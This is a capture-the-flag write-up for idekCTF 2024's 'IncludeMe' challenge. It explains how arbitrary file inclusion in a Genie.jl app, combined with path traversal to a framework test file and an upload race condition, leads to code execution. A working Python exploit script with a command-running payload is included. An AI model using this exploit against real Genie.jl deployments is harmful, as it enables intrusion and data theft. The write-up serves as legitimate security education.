---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466X3TWQQ25%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T092806Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDIaCXVzLXdlc3QtMiJHMEUCIQDwAJdrexDs1wSmzAsclkVkGhwRBcFQa6N0z4RHebWRBAIgfwL4XHwu%2FWrMLpDZoiWs%2BHvhiCr2i%2FrFVgEI1wx9%2FcoqiAQI6v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDM7VW9cGXkfBrP5C4SrcA46k5pVRNlSpYHp2vPGuZHH0m7SrOHaLGuPtKmAvLZybZuzjT%2F6yLHJfBrQQt5MUnAhH3HY%2BYG97dBv1IbP0T3vd1SWm%2B0RwmTr8iKoSSVl34tucQOMf6PvalZwzJrm0ED9lWS1rEL%2FChXFpnoOr9AKAg75p4OF%2Bu8xp0h2vbZh9hmG8wTxehlwJcZHi4MjZYzFWWvNXhhsskw9P9ROvxC2g2bTE4m%2FfzzD0joM2Vm0TTYnI6GvR9OKTf7oj8xWPJ7cBGwRMJMnwZPuLmRf1M2E5ZRYVPgTo1dS2B7K8ZYNvw3fTgVhvlOJAqzm4P1jCrzwvFgwyd97gZYcSwq9Hes4ZOYaSVKDjroZrOYwqss3Z4iXe2xUMAPn1wvVxylqyb%2FQMAHXwDe96GEkbQtbaaW47SjSfDEeZu42X7kis8Q8zWg6yHfJEq9N9WZ14C7jdpH2TFBlmkasVLskcnTEULwZH4eVN5b8CkzHxie2ar5v6dZ89BGrp4dTiHC1xjUKLLg2Sh1QqMFhyOK3kS9IKIBRTGK5V4goiBLm7BvYdhELiv8q0xgerEkuUWui4UJdtnoixlg2RUhYWDvxHcNhw17cMdPFtKaVQkkuseolV1p54iszXLwMsFl3dGAsuMKr7wMEGOqUBKQwyznBioqgv6kIMf12YXbF6oAPrc7Y6tqmFm%2FXmoVO3%2FHDD3%2Fzr207aydeDNnv39XwrMHCNGJXFIrM1aBsiIk8evzn6QOwjAeuSV7cYvJIsmDKg6xexb3yUXxRyiZFI6gGTjANrc3WN3giZLX%2BWY6KmFRq1ENysAwyVwOwvQDzTmyI51AmVTw1RGCXe0vtY3DRTuVNfAJwzu5snB0iy0j7%2Bgsno\&X-Amz-Signature=33632ae21e126ebd40db8365e6f7d601054f9406aa8f17c6dd1aa3c1ce11d40e\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
